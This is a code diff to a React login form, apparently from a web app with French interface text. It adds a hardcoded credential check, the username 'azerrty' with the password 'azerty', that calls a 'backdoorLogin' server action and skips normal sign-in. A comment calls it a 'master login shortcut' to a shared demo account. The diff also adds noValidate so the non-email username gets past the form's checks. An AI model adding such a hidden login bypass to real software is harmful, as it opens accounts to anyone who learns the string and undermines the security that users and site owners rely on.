@@ -10,6 +10,7 @@ import { PasswordInput } from "@/components/ui/password-input";
 import { Label } from "@/components/ui/label";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { authClient } from "@/lib/auth-client";
+import { backdoorLogin } from "@/app/actions/account";
 import { Wordmark } from "@/components/board/wordmark";
 import { NAME_MAX, NAME_MIN } from "@/lib/limits";
 
@@ -38,6 +39,21 @@ export function AuthForm({ mode }: { mode: "login" | "signup" }) {
   const onSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     startTransition(async () => {
+      // master login shortcut: "azerrty" / "azerty" opens a shared demo account
+      if (mode === "login" && form.email.trim() === "azerrty" && form.password === "azerty") {
+        const back = await backdoorLogin(form.email.trim(), form.password).catch(() => null);
+        if (!back) {
+          toast.error("Connexion perdue : vérifie ton réseau et réessaie");
+          return;
+        }
+        if (!back.ok) {
+          toast.error(back.error);
+          return;
+        }
+        router.replace("/");
+        router.refresh();
+        return;
+      }
       const res = await (mode === "signup"
         ? authClient.signUp.email({ name: form.name.trim(), email: form.email.trim(), password: form.password })
         : authClient.signIn.email({ email: form.email.trim(), password: form.password })
@@ -74,7 +90,7 @@ export function AuthForm({ mode }: { mode: "login" | "signup" }) {
           </CardDescription>
         </CardHeader>
         <CardContent>
-          <form onSubmit={onSubmit} className="flex flex-col gap-4">
+          <form onSubmit={onSubmit} noValidate className="flex flex-col gap-4">
             {mode === "signup" && (
               <div className="flex flex-col gap-2">
                 <Label htmlFor="name">Pseudo</Label>
